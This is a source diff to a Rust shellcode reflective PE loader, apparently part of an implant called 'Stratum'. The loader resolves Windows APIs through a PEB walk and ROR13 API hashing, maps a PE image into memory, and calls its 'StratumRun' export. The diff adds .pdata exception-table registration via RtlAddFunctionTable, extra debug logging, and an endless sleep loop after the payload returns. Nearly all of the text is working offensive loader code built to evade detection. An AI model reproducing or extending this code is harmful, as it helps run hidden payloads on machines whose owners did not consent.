@@ -129,9 +129,10 @@ const IMAGE_SCN_MEM_EXECUTE: Dword = 0x2000_0000;
 const IMAGE_SCN_MEM_WRITE:   Dword = 0x8000_0000;
 
 // Data directory indices
-const IMAGE_DIRECTORY_ENTRY_IMPORT:   usize = 1;
+const IMAGE_DIRECTORY_ENTRY_IMPORT:    usize = 1;
+const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
 const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
-const IMAGE_DIRECTORY_ENTRY_TLS:      usize = 9;
+const IMAGE_DIRECTORY_ENTRY_TLS:       usize = 9;
 
 // VirtualProtect flags
 const PAGE_READWRITE:          Dword = 0x04;
@@ -189,6 +190,8 @@ type FnTlsAlloc         = unsafe extern "win64" fn() -> Dword;
 type FnHeapAlloc        = unsafe extern "win64" fn(*mut c_void, Dword, ULongPtr) -> *mut c_void;
 type FnHeapCreate       = unsafe extern "win64" fn(Dword, ULongPtr, ULongPtr) -> *mut c_void;
 type FnGetProcessHeap   = unsafe extern "win64" fn() -> *mut c_void;
+// RtlAddFunctionTable(FunctionTable: *const u8, EntryCount: u32, BaseAddress: u64) -> u8
+type FnRtlAddFunctionTable = unsafe extern "win64" fn(*const u8, Dword, u64) -> u8;
 
 // ── OutputDebugStringA for loader diagnostics ─────────────────────────────────
 // Resolved lazily from kernel32 via ROR13 hash. Used only when STRATUM_SC_DEBUG
@@ -239,6 +242,7 @@ const H_HEAP_ALLOC:                 u32 = api_hash(b"HeapAlloc");
 const H_HEAP_CREATE:                u32 = api_hash(b"HeapCreate");
 const H_GET_PROCESS_HEAP:           u32 = api_hash(b"GetProcessHeap");
 const H_RTL_INIT_UNICODE_STRING:    u32 = api_hash(b"RtlInitUnicodeString");
+const H_RTL_ADD_FUNCTION_TABLE:     u32 = api_hash(b"RtlAddFunctionTable");
 
 // ── PEB walk: find module base by name hash ───────────────────────────────────
 // PEB at GS:[0x60]. LDR at PEB+0x18. InMemoryOrderModuleList at LDR+0x20.
@@ -662,6 +666,24 @@ unsafe fn load_pe(
     }
     sc_log(k32, b"[lpe] section perms set\0".as_ptr());
 
+    // ── 7b. Register exception handlers (.pdata) ─────────────────────────────
+    // Without RtlAddFunctionTable, any exception (Rust panic, stack overflow,
+    // access violation) causes silent process termination — Windows cannot
+    // unwind the stack through reflectively-loaded code without .pdata.
+    let exc_dir = opt.data_directory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+    if exc_dir.virtual_address != 0 && exc_dir.size >= 12 {
+        let p_raft = get_proc_by_hash(k32, H_RTL_ADD_FUNCTION_TABLE);
+        if !p_raft.is_null() {
+            let raft: FnRtlAddFunctionTable = mem::transmute(p_raft);
+            let table_ptr = (base + exc_dir.virtual_address as usize) as *const u8;
+            let entry_count = exc_dir.size / 12; // RUNTIME_FUNCTION = 12 bytes
+            raft(table_ptr, entry_count, base as u64);
+            sc_log(k32, b"[lpe] .pdata registered\0".as_ptr());
+        } else {
+            sc_log(k32, b"[lpe] WARN: no RtlAddFunctionTable\0".as_ptr());
+        }
+    }
+
     // ── 8. TLS init + callbacks ───────────────────────────────────────────────
     let tls_dir_entry = opt.data_directory[IMAGE_DIRECTORY_ENTRY_TLS];
     if tls_dir_entry.virtual_address != 0 {
@@ -830,14 +852,22 @@ unsafe fn load_pe(
 
     if !p_sr.is_null() {
         sc_log(k32, b"[lpe] calling StratumRun\0".as_ptr());
+        sc_log(k32, b"[lpe] sr_addr ok, tls_info ok\0".as_ptr());
         // Pass tls_info_block so each new thread can init its TLS storage before
         // any Rust thread-local access. Windows skips DLL_THREAD_ATTACH for
         // reflectively loaded DLLs — without this, TLS slots are NULL on new threads.
         type FnStratumRun = unsafe extern "win64" fn(*mut c_void) -> Dword;
         let sr: FnStratumRun = mem::transmute(p_sr);
-        sr(tls_info_block as *mut c_void);
-        sc_log(k32, b"[lpe] StratumRun returned (unexpected)\0".as_ptr());
-        return 99;
+        let sr_ret = sr(tls_info_block as *mut c_void);
+        sc_log(k32, b"[lpe] StratumRun returned!\0".as_ptr());
+        // If we get here, StratumRun exited — sleep forever to keep process alive
+        // so we can inspect. Log the return code.
+        let sleep_ptr = get_proc_by_hash(k32, H_SLEEP);
+        if !sleep_ptr.is_null() {
+            let slp: FnSleep = mem::transmute(sleep_ptr);
+            loop { slp(60_000); }
+        }
+        return sr_ret;
     }
 
     // ── 13. Fallback: no StratumRun — call OEP directly ──────────────────────
